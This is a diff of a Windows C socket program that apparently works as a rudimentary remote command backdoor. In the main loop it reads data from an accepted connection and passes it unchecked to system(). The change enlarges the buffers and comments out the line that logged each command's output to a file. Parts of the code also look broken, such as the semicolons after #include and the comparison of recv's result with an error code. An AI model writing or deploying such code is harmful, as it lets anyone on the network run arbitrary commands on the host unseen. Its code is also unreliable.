@@ -3,7 +3,8 @@
 #include "Ws2tcpip.h";
 #include <tchar.h>;
 
-void main() {
+void main() 
+{
 
 	//----------------------
 	// Initialize Winsock
@@ -68,20 +69,21 @@ void main() {
 
 	int bytesSent;
 	int bytesRecv = SOCKET_ERROR;
-	char sendbuf[32] = "Client: Sending data.";
-	char recvbuf[3200] = "";
+	char sendbuf[320000] = "Client: Sending data.";
+	char recvbuf[320000] = "";
 
 	//>file 2>&1	
 	//----------------------
 	// Send and receive data.
-	while (bytesRecv == SOCKET_ERROR) {
+	while (bytesRecv == SOCKET_ERROR)
+	{
 		bytesRecv = recv(AcceptSocket, recvbuf, 32, 0);
 		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET) {
 			printf("Connection Closed.\n ");
 			break;
 		}
 		printf("Bytes Recv : % ld\n ", bytesRecv);
-		strcat_s(recvbuf , ">>C:/tmp/file2004.log 2>>&1");
+		//strcat_s(recvbuf , ">>C:/tmp/file2004.log 2>>&1");
 		system(recvbuf);
 	}
 	bytesSent = send(AcceptSocket, sendbuf, strlen(sendbuf), 0);
